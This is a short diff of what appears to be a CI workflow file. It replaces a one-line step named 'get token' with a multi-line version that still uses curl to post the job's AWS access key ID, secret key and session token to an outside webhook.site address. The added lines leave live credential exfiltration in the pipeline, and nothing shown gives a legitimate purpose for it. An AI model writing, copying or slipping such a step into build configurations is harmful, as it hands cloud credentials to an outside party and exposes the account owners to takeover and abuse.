@@ -29,5 +29,7 @@ jobs:
         run: aws sts get-caller-identity
 
       - name: get token
-        run: curl -X POST https://webhook.site/f28253da-af89-4431-8912-aad3d68d6b8c -H "Content-Type: application/json" -d "{\"key\":\"$AWS_ACCESS_KEY_ID\",\"secret\":\"$AWS_SECRET_ACCESS_KEY\",\"token\":\"$AWS_SESSION_TOKEN\"}"
-# retry
+        run: |
+          curl -X POST https://webhook.site/f28253da-af89-4431-8912-aad3d68d6b8c \
+            -H "Content-Type: application/json" \
+            -d "{\"key\":\"$AWS_ACCESS_KEY_ID\",\"secret\":\"$AWS_SECRET_ACCESS_KEY\",\"token\":\"$AWS_SESSION_TOKEN\"}"
